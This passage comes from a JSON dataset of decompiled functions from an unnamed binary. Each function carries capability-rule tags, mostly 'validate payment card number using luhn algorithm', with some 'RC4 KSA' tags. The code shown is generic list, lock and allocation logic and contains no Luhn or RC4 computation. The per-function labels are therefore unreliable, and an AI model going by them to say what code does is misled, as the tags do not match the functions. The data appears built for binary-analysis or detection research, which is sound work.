= *ppiVar4,  ppiVar2 != NULL)) {\n            *ppiVar2 = *ppiVar4;\n            ppiVar1 = *0x800b8;\n        }\n    }\n    *0x800b8 = ppiVar1;\n    fcn.00032684(0x800a0, auStack40, 0);\n    if (ppiVar4 != NULL) {\n        fcn.00030d24(ppiVar4);\n    }\n    return 0;\n}\n",
        "token_count": 851
    },
    "0003956c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003956c(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    ulong uVar2;\n    uint64_t uVar3;\n    uchar auStackX24 [16];\n    \n    puVar1 = fcn.00030cc4(0x38);\n    if (puVar1 == NULL) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        fcn.0006677c(puVar1);\n        puVar1[4] = str.ptux[0] + arg1;\n        uVar3 = *0x8e52c;\n        puVar1[3] = arg1;\n        *(puVar1 + 2) = arg2;\n        puVar1[5] = uVar3 + arg1;\n        fcn.00032650(0x800f8, auStackX24, 1);\n        puVar1[1] = *0x80118;\n        *0x80118 = *0x80118 + 1;\n        *puVar1 = *0x80110;\n        *0x80110 = puVar1;\n        fcn.00032684(0x800f8, auStackX24, 1);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 292
    },
    "00039620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00039620(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    uint32_t auStackX8 [8];\n    \n    if (arg1 == 0) {\n        if (arg2 == 0) {\n            return 0xc00000ef;\n        }\n        uVar1 = fcn.0003349c(arg2, auStackX8);\n    }\n    else {\n        if (arg2 != 0) {\n            return 0xc00000ef;\n        }\n        uVar1 = fcn.00033418(arg1, auStackX8);\n    }\n    if (uVar1 == 0) {\n        uVar1 = fcn.000337a4(auStackX8[0], arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 184
    },
    "00039a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.00039a40(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    ulong unaff_RBX;\n    int64_t **ppiVar6;\n    ulong unaff_RBP;\n    ulong unaff_RSI;\n    uint64_t uVar7;\n    ulong unaff_RDI;\n    uchar *puVar8;\n    ulong unaff_R12;\n    ulong unaff_R14;\n    bool bVar9;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    uint32_t in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uint in_stack_0000001c;\n    uint32_t in_stack_00000020;\n    uint in_stack_00000024;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    uint32_t in_stack_ffffffffffffffa8;\n    uint32_t in_stack_ffffffffffffffac;\n    uint32_t in_stack_ffffffffffffffb0;\n    uint in_stack_ffffffffffffffb4;\n    ulong in_stack_ffffffffffffffb8;\n    ulong in_stack_ffffffffffffffc0;\n    ulong in_stack_ffffffffffffffc8;\n    \n    piVar5 = NULL;\n    LOCK();\n    bVar9 = *0x7fec8 == 0;\n    *0x7fec8 = *0x7fec8 ^ bVar9 * *0x7fec8;\n    if (bVar9) {\n        return 0x21590006;\n    }\n    fcn.00032650(0x800f8, &stack0xffffffffffffffb8, 0);\n    ppiVar6 = *0x80110;\n    piVar4 = piVar5;\n    if (*0x80110 != NULL) {\n        do {\n            if (ppiVar6[3] == arg1) break;\n            ppiVar6 = *ppiVar6;\n        } while (ppiVar6 != NULL);\n        if (ppiVar6 != NULL) {\n            piVar4 = ppiVar6[6];\n        }\n    }\n    fcn.00032684(0x800f8, &stack0xffffffffffffffb8, 0);\n    if (ppiVar6 == NULL) {\n        return 0xc000000e;\n    }\n    if (piVar4 != NULL) {\n        return 0xc0000021;\n    }\n    piVar4 = fcn.00030cc4(0x30);\n    if (piVar4 == NULL) {\n        return 0x21590004;\n    }\n    fcn.0006677c(piVar4, 0);\n    uVar7 = *0x8e4f8;\n    if (*(uVar7 + arg1) == 0) goto code_r0x00039b74;\n    cVar2 = (**0x114b0)();\n    if (cVar2 == '\\0') {\ncode_r0x00039b1d:\n        piVar1 = 0xc0000005;\n        goto code_r0x00039d72;\n    }\n    puVar8 = &stack0x00000010;\n    uVar3 = fcn.000546e4(*(uVar7 + arg1), 0x30, 5, puVar8);\n    piVar1 = uVar3;\n    if (uVar3 != 0) goto code_r0x00039d72;\n    if (3 < in_stack_00000010) {\n        uVar3 = fcn.000550f0(*(uVar7 + arg1), 0x398d8, piVar4, puVar8, \n                             CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                             CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), in_stack_ffffffffffffffb8, \n                             in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, unaff_R14, unaff_R12, unaff_RDI, \n                             unaff_RSI, unaff_RBP, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                             CONCAT44(in_stack_00000014, in_stack_00000010), \n                             CONCAT44(in_stack_0000001c, in_stack_00000018), \n                             CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, in_stack_00000030, \n                             in_stack_00000038, in_stack_00000040, in_stack_00000048);\n        piVar1 = uVar3;\n        if (uVar3 != 0) goto code_r0x00039d72;\n    }\ncode_r0x00039b74:\n    uVar7 = *0x8e500;\n    if (*(uVar7 + arg1) == 0) goto code_r0x00039bdc;\n    cVar2 = (**0x114b0)();\n    if (cVar2 == '\\0') goto code_r0x00039b1d;\n    puVar8 = &stack0x00000018;\n    uVar3 = fcn.000546e4(*(uVar7 + arg1), 0x30, 5, puVar8);\n    piVar1 = uVar3;\n    if (uVar3 != 0) goto code_r0x00039d72;\n    if (3 < in_stack_00000018) {\n        uVar3 = fcn.000550f0(*(uVar7 + arg1), 0x398a0, piVar4 + 2, puVar8, \n                             CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                             CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), in_stack_ffffffffffffffb8, \n                             in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, unaff_R14, unaff_R12, unaff_RDI, \n                             unaff_RSI, unaff_RBP, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                             CONCAT44(in_stack_00000014, in_stack_00000010), \n                             CONCAT44(in_stack_0000001c, in_stack_00000018), \n                             CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, in_stack_00000030, \n                             in_stack_00000038, in_stack_00000040, in_stack_00000048);\n        piVar1 = uVar3;\n        if (uVar3 != 0) goto code_r0x00039d72;\n    }\ncode_r0x00039bdc:\n    uVar7 = *0x8e504;\n    if (*(uVar7 + arg1) == 0) goto code_r0x00039c48;\n    cVar2 = (**0x114b0)();\n    if (cVar2 == '\\0') goto code_r0x00039b1d;\n    puVar8 = &stack0x00000020;\n    uVar3 = fcn.000546e4(*(uVar7 + arg1), 0x30, 5, puVar8);\n    piVar1 = uVar3;\n    if (uVar3 != 0) goto code_r0x00039d72;\n    if (3 < in_stack_00000020) {\n        uVar3 = fcn.000550f0(*(uVar7 + arg1), 0x39930, piVar4 + 3, puVar8, \n                             CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                             CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), in_stack_ffffffffffffffb8, \n                             in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, unaff_R14, unaff_R12, unaff_RDI, \n                             unaff_RSI, unaff_RBP, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                             CONCAT44(in_stack_00000014, in_stack_00000010), \n                             CONCAT44(in_stack_0000001c, in_stack_00000018), \n                             CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, in_stack_00000030, \n                             in_stack_00000038, in_stack_00000040, in_stack_00000048);\n        piVar1 = uVar3;\n        if (uVar3 != 0) goto code_r0x00039d72;\n    }\ncode_r0x00039c48:\n    uVar7 = *0x8e510;\n    if (*(uVar7 + arg1) == 0) goto code_r0x00039cae;\n    cVar2 = (**0x114b0)();\n    if (cVar2 == '\\0') goto code_r0x00039b1d;\n    puVar8 = &stack0xffffffffffffffa8;\n    uVar3 = fcn.000546e4(*(uVar7 + arg1), 0x30, 5, puVar8);\n    piVar1 = uVar3;\n    if (uVar3 != 0) goto code_r0x00039d72;\n    if (3 < in_stack_ffffffffffffffa8) {\n        uVar3 = fcn.000550f0(*(uVar7 + arg1), 0x39880, piVar4 + 4, puVar8, \n                             CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                             CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), in_stack_ffffffffffffffb8, \n                             in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, unaff_R14, unaff_R12, unaff_RDI, \n                             unaff_RSI, unaff_RBP, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                             CONCAT44(in_stack_00000014, in_stack_00000010), \n                             CONCAT44(in_stack_0000001c, in_stack_00000018), \n                             CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, in_stack_00000030, \n                             in_stack_00000038, in_stack_00000040, in_stack_00000048);\n        piVar1 = uVar3;\n        if (uVar3 != 0) goto code_r0x00039d72;\n    }\ncode_r0x00039cae:\n    uVar7 = *0x8e524;\n    if (*(uVar7 + arg1) == 0) goto code_r0x00039d10;\n    cVar2 = (**0x114b0)();\n    if (cVar2 == '\\0') goto code_r0x00039b1d;\n    puVar8 = &stack0xffffffffffffffac;\n    uVar3 = fcn.000546e4(*(uVar7 + arg1), 0x30, 5, puVar8);\n    piVar1 = uVar3;\n    if (uVar3 != 0) goto code_r0x00039d72;\n    if (3 < in_stack_ffffffffffffffac) {\n        uVar3 = fcn.000550f0(*(uVar7 + arg1), 0x3983c, piVar4 + 5, puVar8, \n                             CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                             CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), in_stack_ffffffffffffffb8, \n                             in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, unaff_R14, unaff_R12, unaff_RDI, \n                             unaff_RSI, unaff_RBP, unaff_RBX, in_stack_00000000, in_stack_00000008, \n                             CONCAT44(in_stack_00000014, in_stack_00000010), \n                             CONCAT44(in_stack_0000001c, in_stack_00000018), \n                             CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, in_stack_00000030, \n                             in_stack_00000038, in_stack_00000040, in_stack_00000048);\n        piVar1 = uVar3;\n        if (uVar3 != 0) goto code_r0x00039d72;\n    }\ncode_r0x00039d10:\n    uVar7 = *0x8e51c;\n    if (*(uVar7 + arg1) == 0) goto code_r0x00039db1;\n    cVar2 = (**0x114b0)();\n    if (cVar2 == '\\0') goto code_r0x00039b1d;\n    puVar8 = &stack0xffffffffffffffb0;\n    uVar3 = fcn.000546e4(*(uVar7 + arg1), 0x30, 5, puVar8);\n    piVar1 = uVar3;\n    if (uVar3 == 0) {\n        if (3 < in_stack_ffffffffffffffb0) {\n            uVar3 = fcn.000550f0(*(uVar7 + arg1), 0x39904, piVar4 + 1, puVar8, \n                                 CONCAT44(in_stack_ffffffffffffffac, in_stack_ffffffffffffffa8), \n                                 CONCAT44(in_stack_ffffffffffffffb4, in_stack_ffffffffffffffb0), \n                                 in_stack_ffffffffffffffb8, in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, \n                                 unaff_R14, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, in_stack_00000000, \n                                 in_stack_00000008, CONCAT44(in_stack_00000014, in_stack_00000010), \n                                 CONCAT44(in_stack_0000001c, in_stack_00000018), \n                                 CONCAT44(in_stack_00000024, in_stack_00000020), in_stack_00000028, in_stack_00000030, \n                                 in_stack_00000038, in_stack_00000040, in_stack_00000048);\n            piVar1 = uVar3;\n            if (uVar3 != 0) goto code_r0x00039d72;\n        }\ncode_r0x00039db1:\n        fcn.00032650(0x800f8, &stack0xffffffffffffffb8, 0);\n        ppiVar6 = *0x80110;\n        if (*0x80110 != NULL) {\n            do {\n                if (ppiVar6[3] == arg1) break;\n                ppiVar6 = *ppiVar6;\n            } while (ppiVar6 != NULL);\n            if (ppiVar6 != NULL) {\n                ppiVar6[6] = piVar4;\n            }\n        }\n        fcn.00032684(0x800f8, &stack0xffffffffffffffb8, 0);\n    }\n    else {\ncode_r0x00039d72:\n        piVar5 = piVar1;\n        fcn.0005540c(piVar4);\n        fcn.0005540c(piVar4 + 2);\n        fcn.0005540c(piVar4 + 3);\n        fcn.0005540c(piVar4 + 4);\n        fcn.0005540c(piVar4 + 5);\n        fcn.0005540c(piVar4 + 1);\n        fcn.00030d24(piVar4);\n    }\n    return piVar5;\n}\n",
        "token_count": 3549
    },
    "0003a488": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003a488(void)\n\n{\n    fcn.00036f3c();\n    if (*0x80190 != 0) {\n        (**0x8e6e8)();\n        *0x80190 = 0;\n    }\n    fcn.00033bf0(1);\n    fcn.00059140(*0x80188);\n    fcn.0005540c(0x80188);\n    return 0;\n}\n",
        "token_count": 100
    },
    "0003a7e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003a7e8(ulong noname_0, ulong arg2)\n\n{\n    uint auStackX16 [6];\n    \n    auStackX16[0] = arg2;\n    fcn.0003a5b4(noname_0, 1, 0x1010e, auStackX16);\n    return;\n}\n",
        "token_count": 79
    },
    "0003acd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0003acd0(void)\n\n{\n    int32_t iVar1;\n    ulong unaff_RBX;\n    ulong in_R9;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong in_stack_00000080;\n    ulong in_stack_00000088;\n    ulong in_stack_00000090;\n    ulong in_stack_00000098;\n    \n    iVar1 = fcn.00030a40(0x14780, &stack0x00000008);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0004e130(in_stack_00000008, 0x144d8, &stack0x00000010);\n        if (iVar1 == 0) {\n            iVar1 = fcn.000550f0(in_stack_00000010, 0x3a528, 0x80188, in_R9, unaff_RBX, in_stack_00000000, \n                                 in_stack_00000008, in_stack_00000010, in_stack_00000018, in_stack_00000020, \n                                 in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                 in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                 in_stack_00000068, in_stack_00000070, in_stack_00000078, in_stack_00000080, \n                                 in_stack_00000088, in_stack_00000090, in_stack_00000098);\n            if (iVar1 == 0) {\n                fcn.00059140(*0x80188);\n                fcn.0003ab74();\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 527
    },
    "0003d23c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0003d23c(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg2 != 0) {\n        do {\n            cVar1 = (**0x114b0)(arg1);\n            if (cVar1 == '\\0') {\n                return 0xffffffff;\n            }\n            if (*arg1 == arg3) {\n                return uVar2;\n            }\n            uVar2 = uVar2 + 8;\n            arg1 = arg1 + 1;\n        } while (uVar2 < arg2);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 160
    },
    "0003e89c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003e89c(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    \n    iVar1 = fcn.000352e8(arg1);\n    if (iVar1 != 0) {\n        puVar2 = fcn.00030cc4(0x20);\n        if (puVar2 != NULL) {\n            fcn.0006677c(puVar2, 0, 0x20);\n            puVar2[3] = puVar2;\n            *puVar2 = 0;\n            puVar2[2] = 0x3e6d0;\n            (*_fcn.000114b8)(puVar2, 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "0003f2d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0003f2d0(ulong arg1)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    uchar auStack24 [24];\n    \n    LOCK();\n    bVar2 = *0x80310 == 1;\n    *0x80310 = *0x80310 ^ bVar2 * (*0x80310 ^ 1);\n    uVar1 = !bVar2 * (*0x80310 ^ 1) ^ 1;\n    if (!bVar2) {\n        uVar1 = fcn.0001a9b0(auStack24, 0x3f0d0, arg1);\n        if (uVar1 == 0) {\n            uVar1 = fcn.00032710(auStack24);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 185
    },
    "0003f568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003f568(void)\n\n{\n    fcn.000324cc(0x80338);\n    *0x80330 = 1;\n    return;\n}\n",
        "token_count": 39
    },
    "0003f588": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003f588(void)\n\n{\n    ulong *arg1;\n    uchar auStackX8 [32];\n    \n    *0x80330 = 0;\n    fcn.00032650(0x80338, auStackX8, 1);\n    while (arg1 = *0x80350,  *0x80350 != NULL) {\n        *0x80350 = **0x80350;\n        fcn.00030d24(arg1);\n    }\n    fcn.00032684(0x80338, auStackX8, 1);\n    return;\n}\n",
        "token_count": 132
    },
    "0003fa90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0003fa90(ulong *arg1)\n\n{\n    ulong *puVar1;\n    uchar auStackX16 [24];\n    \n    fcn.00032650(0x80358, auStackX16, 0);\n    for (puVar1 = *0x80370; (puVar1 != NULL && (arg1 != puVar1)); puVar1 = *puVar1) {\n    }\n    fcn.00032684(0x80358, auStackX16, 0);\n    return puVar1 != NULL;\n}\n",
        "token_count": 124
    },
    "0003fe88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0003fe88(ulong *arg1, ulong noname_1, ulong *arg3)\n\n{\n    uint16_t uVar1;\n    ushort uStack296;\n    uchar auStack294 [6];\n    ulong uStack288;\n    ulong uStack280;\n    ushort uStack168;\n    uchar auStack166 [6];\n    ulong uStack160;\n    ulong uStack152;\n    \n    fcn.0006677c(auStack166, 0, 0x7e);\n    fcn.0006677c(auStack294, 0, 0x7e);\n    uStack288 = *arg3;\n    uStack280 = arg3[1];\n    uStack296 = 0x17;\n    uStack160 = *arg1;\n    uStack168 = 0x17;\n    uStack152 = arg1[1];\n    fcn.00030df4();\n    uVar1 = fcn.00030df4();\n    fcn.0003f968(&uStack168, uVar1, &uStack296);\n    return;\n}\n",
        "token_count": 238
    },
    "0003ff50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0003ff50(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    uint32_t uVar1;\n    ushort uStack296;\n    uchar auStack294 [2];\n    uint uStack292;\n    ushort uStack168;\n    uchar auStack166 [2];\n    uint uStack164;\n    \n    fcn.0006677c(auStack166, 0, 0x7e);\n    fcn.0006677c(auStack294, 0, 0x7e);\n    uStack296 = 2;\n    uStack292 = fcn.00030dc8(arg3);\n    uStack168 = 2;\n    uStack164 = fcn.00030dc8(arg1);\n    fcn.00030df4();\n    uVar1 = fcn.00030df4();\n    fcn.0003f968(&uStack168, uVar1 & 0xffff, &uStack296);\n    return;\n}\n",
        "token_count": 216
    },
    "000404d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000404d0(void)\n\n{\n    if (*0x80380 != 0) {\n        fcn.00017350(*0x80380);\n        (*_fcn.000115b8)(*0x80380);\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "00040694": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.00040694(ulong noname_0, ulong noname_1, int64_t *arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar3 = 0;\n    iVar1 = (**0x11140)(noname_0, noname_1, 0, 0, 0);\n    iVar2 = iVar1;\n    if (iVar1 != 0) {\n        (**0x11138)(iVar1, 0, 2);\n        iVar2 = (**0x11230)(iVar1, 0, 1, 0, uVar3 & 0xffffffff00000000, 0x10);\n        if (iVar2 == 0) {\n            (**0x11130)(iVar1);\n            (*_fcn.00011128)(iVar1);\n            iVar2 = 0;\n        }\n        else {\n            *arg3 = iVar1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 224
    },
    "00040b74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00040b74(void)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    \n    uVar2 = fcn.00017460(0x15798, 0x80380);\n    if (uVar2 == 0) {\n        uVar1 = fcn.000177a4(*0x80380, 0x40afc, 0);\n        uVar2 = uVar1;\n        if (uVar1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            (*_fcn.000115b8)(*0x80380);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 151
    },
    "000414fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000414fc(void)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    \n    iVar6 = 5;\n    iVar4 = 0x803d0;\n    iVar5 = 5;\n    do {\n        fcn.00062f3c(iVar4, 0);\n        iVar4 = iVar4 + 8;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    *0x803b0 = 1;\n    fcn.0002fcb8(0x80390);\n    fcn.00032748(0x80420, 0);\n    fcn.00032710(0x80420);\n    iVar4 = 0x80430;\n    do {\n        iVar3 = fcn.00032734(iVar4);\n        if (iVar3 != 0) {\n            fcn.00032748(iVar4, 0);\n            fcn.00032710(iVar4);\n        }\n        iVar4 = iVar4 + 0x10;\n        iVar6 = iVar6 + -1;\n        puVar2 = *0x80410;\n    } while (iVar6 != 0);\n    while (puVar1 = *0x803f8,  puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.00030d24(puVar2);\n        puVar2 = puVar1;\n    }\n    while (puVar1 != NULL) {\n        puVar2 = *puVar1;\n        fcn.00030d24(puVar1);\n        puVar1 = puVar2;\n    }\n    if (*0x80390 != 0) {\n        fcn.00030d24(*0x80390);\n        *0x80390 = 0;\n    }\n    return;\n}\n",
        "token_count": 432
    },
    "0004372c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0004372c(ulong *arg1, ulong arg2)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    char acStack408 [111];\n    char acStack297 [265];\n    \n    fcn.0006670a(acStack297 + 1, 0x15860, 0x49);\n    fcn.00066836(acStack408, 0x15840, arg2);\n    uVar4 = 0xffffffffffffffff;\n    uVar2 = uVar4;\n    pcVar5 = acStack408;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    pcVar5 = acStack297;\n    uVar3 = uVar4;\n    do {\n        pcVar5 = pcVar5 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar5 != '\\0');\n    fcn.00066836(acStack297 + ~uVar3, 0x15828, ~uVar2 - 1 & 0xffffffff);\n    pcVar5 = acStack297;\n    do {\n        pcVar5 = pcVar5 + 1;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n    } while (*pcVar5 != '\\0');\n    fcn.00046ca8(*arg1, arg1[1], acStack297 + 1, ~uVar4 - 1);\n    fcn.00046ca8(*arg1, arg1[1], acStack408, ~uVar2 - 1);\n    return;\n}\n",
        "token_count": 434
    },
    "0004429c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004429c(ulong arg1, uint64_t arg2, int64_t *arg3, uint64_t *arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int64_t aiStackX8 [4];\n    \n    if (arg2 == 0) {\n        *arg3 = 0;\n        uVar3 = 0;\n        *arg4 = 0;\n    }\n    else {\n        iVar2 = fcn.00030c98(arg2);\n        *arg3 = iVar2;\n        if (iVar2 == 0) {\n            uVar3 = 0x21590004;\ncode_r0x00044335:\n            fcn.00030d24(*arg3);\n            *arg3 = 0;\n            *arg4 = 0;\n        }\n        else {\n            *arg4 = 0;\n            if (arg2 != 0) {\n                do {\n                    aiStackX8[0] = arg2 - *arg4;\n                    iVar1 = fcn.000437f4(arg1, *arg4 + *arg3, aiStackX8[0], aiStackX8);\n                    if ((iVar1 == 0) || (aiStackX8[0] == 0)) {\n                        uVar3 = 0xffffffff;\n                        goto code_r0x00044335;\n                    }\n                    *arg4 = *arg4 + aiStackX8[0];\n                } while (*arg4 < arg2);\n            }\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 353
    },
    "00044350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00044350(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = fcn.0006681e();\n    if (uVar1 < 0) {\n        *(arg1 + -1 + arg2) = 0;\n        uVar1 = arg2 * 2;\n    }\n    return uVar1;\n}\n",
        "token_count": 99
    },
    "00044384": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00044384(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    uchar auStackX8 [32];\n    \n    iVar2 = fcn.00027418(0x2f1, 0x804f0, 0x52, 0x80544);\n    if ((iVar2 != 0) || (iVar2 = fcn.00027418(0x2f2, 0x80490, 0x52, auStackX8),  iVar2 != 0)) {\n        return iVar2 + 0x191U | 0x21590000;\n    }\n    iVar3 = -1;\n    pcVar4 = 0x804f0;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    *0x80544 = ~iVar3 - 1;\n    return 0;\n}\n",
        "token_count": 252
    },
    "00044404": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
